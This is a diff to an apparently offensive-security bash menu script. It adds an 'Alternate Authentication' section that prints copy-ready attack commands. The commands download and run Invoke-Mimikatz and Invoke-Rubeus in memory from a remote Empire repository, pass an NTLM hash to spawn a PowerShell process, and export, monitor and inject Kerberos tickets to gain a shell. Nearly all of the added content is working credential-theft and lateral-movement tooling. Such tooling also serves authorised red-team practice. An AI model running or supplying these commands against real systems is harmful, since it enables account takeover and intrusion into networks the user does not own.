@@ -77,29 +77,120 @@ echo -e ""
 echo -ne " What would you like to do?
 
 
-	1)  ->  [ Credential Access	]
-	2)  ->  [ MiTM Attacks 		]
-	3)  ->  [ MSSQL 		]
-        4)  ->  [ Password Spraying 	]
-        5)  ->  [ Privilege Escalation	]
-        6)  ->  [ Recon 		]
+	1)  ->  [ Alternate Authentication	]
+	2)  ->  [ Credential Access		]
+	3)  ->  [ MiTM Attacks 			]
+	4)  ->  [ MSSQL 			]
+        5)  ->  [ Password Spraying 		]
+        6)  ->  [ Privilege Escalation		]
+        7)  ->  [ Recon 			]
         
-        a)  ->	[ AMSI Bypasses		]
+        a)  ->	[ AMSI Bypasses			]
         
 "
         read a
         case $a in
-                1) 	Internal_Menu_Credential_Access ;;
-        	2) 	Internal_Menu_MiTM_Attacks ;;
-        	3) 	Internal_Menu_MSSQL ;;
-	        4) 	Internal_Menu_Password_Spraying ;;
-	        5) 	Internal_Menu_Privilege_Escalation ;;
-	        6) 	Internal_Menu_Recon ;;
+                1) 	Internal_Menu_Alternate_Authentication ;;
+                2) 	Internal_Menu_Credential_Access ;;
+        	3) 	Internal_Menu_MiTM_Attacks ;;
+        	4) 	Internal_Menu_MSSQL ;;
+	        5) 	Internal_Menu_Password_Spraying ;;
+	        6) 	Internal_Menu_Privilege_Escalation ;;
+	        7) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
 }
+
+Internal_Menu_Alternate_Authentication(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select Alternate Authentication Material Type
+
+
+
+        1)  ->  [ Pass the Hash			]
+        2)  ->  [ Pass the Ticket		]
+"
+
+        read a
+        case $a in
+                1) 	Internal_Menu_Alternate_Authentication_Pass_Hash ;;
+        	2) 	Internal_Menu_Alternate_Authentication_Pass_Ticket ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+Internal_Menu_Alternate_Authentication_Pass_Hash(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""      
+echo -e "${LGREEN}Pass the Hash${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"  
+echo -e ""
+echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
+echo -e ""
+echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTORE}"
+echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
+echo -e ""
+echo -e ""
+}
+
+
+Internal_Menu_Alternate_Authentication_Pass_Ticket(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""      
+echo -e "${LGREEN}Pass the Ticket${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"  
+echo -e ""
+echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
+echo -e ""
+echo -e "${YELLOW}Collect Tickets${RESTORE}"
+echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::tickets /export\""'"
+echo -e ""
+echo -e ""
+echo -e "${YELLOW}Inject collected ticket${RESTORE}"
+echo -e "Invoke-Mimikatz -Command '"\"kerberos::ptt [Ticket.kirbi]\""'"
+echo -e ""
+echo -e "${YELLOW}spawn CMD with the injected ticket${RESTORE}"
+echo -e "Invoke-Mimikatz -Command '"\"misc::cmd\""'"
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}Rubeus${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}Load Rubeus into memory${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1)"
+echo -e ""
+echo -e "${YELLOW}Collect Tickets${RESTORE}"
+echo -e "Invoke-Rubeus -Command "\"dump /nowrap"\""
+echo -e ""
+echo -e "${YELLOW}Monitor for new tickets (Optional)${RESTORE}"
+echo -e "Invoke-Rubeus -Command "\"monitor /interval:5 /nowrap"\""
+echo -e ""
+echo -e "${YELLOW}Inject ticket (base64 blob)${RESTORE}"
+echo -e "Invoke-Rubeus -Command "\"ptt /ticket:[Base64Blob]"\""
+echo -e ""
+echo -e ""
+}
+
 
 Internal_Menu_Credential_Access(){
 
